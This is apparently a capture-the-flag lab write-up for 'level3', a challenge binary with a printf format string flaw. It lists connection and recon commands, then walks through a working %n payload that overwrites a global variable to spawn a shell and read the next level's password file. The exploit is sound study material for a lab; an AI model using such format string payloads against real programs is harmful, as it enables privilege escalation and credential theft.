# Level3 — Commands

## Connection

```bash
ssh level3@localhost -p 4242
```

Password: (in `level2/flag`)

---

## Recon

```bash
pwd
ls -la
file level3
readelf -h level3
```

Extraction (from the host):

```bash
cd level3
sshpass -p '<level3_password>' scp -o StrictHostKeyChecking=no -P 4242 level3@localhost:level3 ./level3.bin
```

See `analysis.md` for the analysis.

---

## Exploitation

**Format string** vulnerability: `printf(buffer)`. The global variable `m` must equal **64** for `system("/bin/sh")` to be called. We use **%n** to write 64 to the address of `m`.

### 1. Verify the address of `m` on the VM

On the VM, the address may differ from the local analysis:

```bash
objdump -t level3 | grep " m$"
# or
readelf -s level3 | grep " m "
```

Note the displayed address (e.g. 0804988c → little endian `\x8c\x98\x04\x08`).

### 2. Find the format string index (if segfault with %1$n)

On some VMs, argument "1" is not the buffer. Dump the stack:

```bash
python -c 'print "AAAA" + "%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"' | ./level3
```

Identify which number displays **0x41414141** (our "AAAA"). That number is the index to use for **%k$n** (e.g. if it's the 4th: use **%4$n**).

### 3. Payload once the index is known

Replace the index in `%K$n` with the number found in step 2 (often 1, 4, or 7). Address of `m` in little endian (e.g. 0x0804988c → `\x8c\x98\x04\x08`):

```bash
# Example with index 4 (adjust based on the dump)
( python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat ) | ./level3
```

With index 7:

```bash
( python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%7$n"'; cat ) | ./level3
```

### 4. If it still segfaults

Try each index one by one: **%2$n**, **%3$n**, **%4$n**, **%5$n**, **%6$n**, **%7$n** (same payload, only `$K` changes). One of the indices points to the buffer; that is the one to use to write to the address stored at the start of the buffer (0x804988c).

---

## Retrieving the level4 password

In the shell: `cat /home/user/level4/.pass`. Record in `level3/flag`.
